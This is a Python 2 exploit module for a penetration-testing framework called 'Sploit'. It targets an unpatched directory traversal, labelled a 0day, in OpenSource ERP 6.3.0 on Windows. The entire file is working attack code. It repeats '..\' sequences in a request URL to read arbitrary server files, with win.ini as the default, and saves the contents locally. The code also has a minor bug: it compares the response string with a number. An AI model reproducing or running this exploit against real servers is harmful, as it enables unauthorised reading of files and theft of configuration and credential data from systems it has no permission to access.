#!/usr/bin/env python
import urllib2
import cookielib
import json
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_open_source_erp_dir_trav"
INFO['DESCRIPTION'] = "OpenSource ERP Directory Traversal"
INFO['VENDOR'] = "http://www.nelson-it.ch/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "http://www.nelson-it.ch/download/"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "1 Jun, 2018"
INFO['PATH'] = "WEB/"
INFO["NOTES"] = """
    Remote attacker can read arbitrary files on server using '\..' combination.
Tested against OpenSource ERP 6.3.0 on Windows 7 x64 SP1.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 8024
OPTIONS["FILENAME"] = "windows/win.ini"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"]).replace('/', '\\')

    def make_url(self, path=''):
        url = 'http://{}:{}/'.format(self.host, self.port) + path
        return url

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Trying to recieve ' + self.filename)
        url = self.make_url('main/login/' + '..\\'*8 + self.filename)
        res = urllib2.urlopen(url).read()
        if res < 15000:
            self.log(res)
        self.writefile(res, self.filename.replace('\\', '/').split('/').pop())
        self.log(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()